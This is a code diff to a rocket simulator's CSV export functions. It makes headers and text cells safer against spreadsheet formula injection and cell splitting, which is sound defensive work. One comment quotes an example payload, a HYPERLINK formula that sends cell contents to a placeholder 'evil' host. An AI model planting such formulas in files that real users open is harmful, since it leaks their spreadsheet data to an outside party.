@@ -10,7 +10,7 @@ import { forwardFlightEnd, maxQ, maxQAlpha, maxRollRate, type EventRow } from '.
 import type { LauncherKind } from '../design/launcher';
 import { siToUiDelta, type Quantity, type UnitSelection } from '../../prefs/units';
 import { plainDecimal } from '../files/numberText';
-import { neutralizeFormula } from './csvCell';
+import { csvField, csvQuoted, neutralizeFormula } from './csvCell';
 
 /**
  * CSV exporters for the flight time-series and the drag sweep. Columns are
@@ -106,16 +106,21 @@ export function flightDataCsv(
   const series = branchSeries(r, o.branchIndex);
   const branch = r.branches?.length ? r.branches[o.branchIndex] : undefined;
   const sep = o.separator;
-  // A separator inside a field would split the row; the comment character
-  // leading a data line would comment it out. Neither can happen with the
-  // separators and characters the dialog offers, and a header is the only text
-  // in the file, so quoting stays out of it; the header still gets stripped
-  // rather than trusted.
-  const clean = (text: string) =>
-    text
+  // Text here (column headers and comment lines, which carry the simulation and
+  // stage names from a shared .ork) is never quoted, so whatever a spreadsheet
+  // might split on is replaced with a space: the chosen separator, and `,` `;`
+  // and tab whatever the separator is, because Excel splits a `.csv` on its
+  // locale's list separator rather than the file's. CR and LF would end the
+  // line. A formula trigger is neutralized where a cell can still begin: the
+  // start of the text, which begins a header cell, and with the space
+  // separator after every space.
+  const clean = (text: string) => {
+    const flat = text
       .split(sep)
       .join(' ')
-      .replace(/[\r\n]/g, ' ');
+      .replace(/[\r\n,;\t]/g, ' ');
+    return sep === ' ' ? flat.split(' ').map(neutralizeFormula).join(' ') : neutralizeFormula(flat);
+  };
 
   const unitOf = (c: (typeof cols)[number]): string => (c.quantity ? units[c.quantity] : (c.unit ?? ''));
   const factorOf = (c: (typeof cols)[number]): number =>
@@ -164,10 +169,12 @@ export function flightDataCsv(
 /** Cd / CP / CNα vs Mach, with the friction/pressure/base split and per-component Cd. */
 export function aeroTableCsv(d: AeroSweep, units: UnitSelection): string {
   const len = col(units, 'length');
-  // Strip the delimiters/newlines/quotes an imported component name could carry
-  // so it can't split or corrupt the comma-joined row. (No formula-injection
-  // risk: the `Cd_` prefix means the cell never leads with =/+/-/@.)
-  const compHeader = (name: string) => `Cd_${name.replace(/[[\]"\r\n]/g, '').replace(/,/g, ';')}`;
+  // A component name comes from the design, often a shared .ork. The `Cd_`
+  // prefix keeps a trigger from leading the field, but a `,` `;` or tab inside
+  // the name opens a new cell in a spreadsheet that splits on it, so the header
+  // goes through the shared CSV field rule like every other text cell. Line
+  // breaks become spaces, since a header is one line; brackets are dropped.
+  const compHeader = (name: string) => `Cd_${name.replace(/[[\]]/g, '').replace(/[\r\n]+/g, ' ')}`;
   const header = ['Mach', 'Cd', 'Cd_friction', 'Cd_pressure', 'Cd_base'];
   if (d.hasNozzle) header.push('Cd_powerOn');
   header.push(`CP (${len.sym})`, 'CNalpha (/rad)');
@@ -182,7 +189,7 @@ export function aeroTableCsv(d: AeroSweep, units: UnitSelection): string {
     header.push(n > 1 ? `${base} (${n})` : base);
   }
 
-  const lines = [row(header)];
+  const lines = [row(header.map((h) => csvField(h)))];
   for (let i = 0; i < d.machs.length; i++) {
     const cells: string[] = [
       cell(d.machs[i], 3),
@@ -236,17 +243,11 @@ export function flightEventsCsv(
   // Quoting alone does not stop spreadsheet formula injection: Excel and Sheets
   // strip the quoting before evaluating, so a recovery device named
   // `=HYPERLINK("http://evil/?"&A1,"Open")` in a shared .ork would execute when
-  // the exported events CSV is opened. `neutralizeFormula` prefixes a `'` on a
-  // leading trigger, as reportCsv's `cell` does.
-  //
-  // Strict on a leading `-`, unlike flightPathExport's escaper: every value
-  // here is a name, so there is no negative number to keep numeric, and
-  // `-1+HYPERLINK(...)` does evaluate.
+  // the exported events CSV is opened. `csvQuoted` applies the shared rule,
+  // which neutralizes a trigger at the start and after an embedded separator.
   const text = (v: string | undefined): string => {
     if (v == null || v === '') return '';
-    const flat = v.replace(/[\r\n]+/g, ' ');
-    const safe = neutralizeFormula(flat);
-    return `"${safe.replace(/"/g, '""')}"`;
+    return csvQuoted(v.replace(/[\r\n]+/g, ' '));
   };
 
   const lines: string[] = [];
@@ -321,9 +322,9 @@ export function runTableCsv(
   const acc = col(units, 'acceleration');
   const pres = col(units, 'pressure');
   const roll = col(units, 'rollRate');
-  // Every text cell is the user's own words or a translation: quoted, and a
-  // leading formula trigger neutralized, as the events export does.
-  const text = (v: string): string => `"${neutralizeFormula(v.replace(/[\r\n]+/g, ' ')).replace(/"/g, '""')}"`;
+  // Every text cell is the user's own words or a translation: quoted, and
+  // neutralized by the shared rule, as the events export does.
+  const text = (v: string): string => csvQuoted(v.replace(/[\r\n]+/g, ' '));
   const lines = [
     row([
       'Simulation',
